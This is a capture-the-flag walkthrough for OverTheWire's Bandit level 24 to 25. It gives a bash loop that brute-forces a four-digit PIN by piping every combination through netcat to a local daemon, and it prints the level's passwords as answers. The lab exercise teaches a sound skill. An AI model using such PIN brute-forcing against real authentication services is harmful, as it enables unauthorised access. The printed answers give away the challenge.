
# Bandit Level 24 → Level 25
## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

### Solution

```
for i in {0000..9999}
do
	echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i
done | nc localhost 30002 | grep -v "Wrong"

bandit24@bandit:/tmp/tmp.9BNwCIsQyR$ ./comb.sh 
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
